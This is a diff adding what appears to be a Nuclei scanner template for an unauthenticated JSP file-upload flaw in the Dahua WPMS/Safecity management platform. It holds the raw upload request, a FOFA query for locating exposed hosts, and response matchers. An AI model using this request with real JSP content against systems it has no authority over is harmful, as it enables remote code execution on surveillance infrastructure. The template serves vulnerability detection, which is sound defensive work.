@@ -1,0 +1,37 @@
+id: dahua-wpms-rce
+
+info:
+  name: Dahua Safecity RCE
+  author: zp857
+  severity: high
+  tags: safecity,rce,dahua-wpms
+  metadata:
+    fofa-query: 'app="dahua-智慧园区综合管理平台" || body="/WPMS/"'
+
+requests:
+  - raw:
+      - |
+        POST /face/personInfo/uploadBatch HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary340tb8pD4AtlGMUa
+
+        ------WebKitFormBoundary340tb8pD4AtlGMUa
+        Content-Disposition: form-data; name="file"; filename="1.jsp"
+        Content-Type: application/zip
+
+        123
+        ------WebKitFormBoundary340tb8pD4AtlGMUa
+        Content-Disposition: form-data; name="groupid"
+
+        2
+        ------WebKitFormBoundary340tb8pD4AtlGMUa--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - success
